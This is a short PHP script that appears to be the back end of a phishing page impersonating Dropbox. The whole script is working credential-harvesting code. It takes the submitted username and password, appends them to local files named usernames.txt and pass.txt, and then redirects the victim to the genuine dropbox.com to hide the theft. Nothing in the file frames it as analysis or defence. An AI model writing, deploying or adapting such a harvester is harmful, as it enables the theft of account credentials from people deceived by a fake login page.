<?php

file_put_contents("usernames.txt", "DropBox Username : " . $email = $_POST['username'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "DropBox Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://dropbox.com');
?>
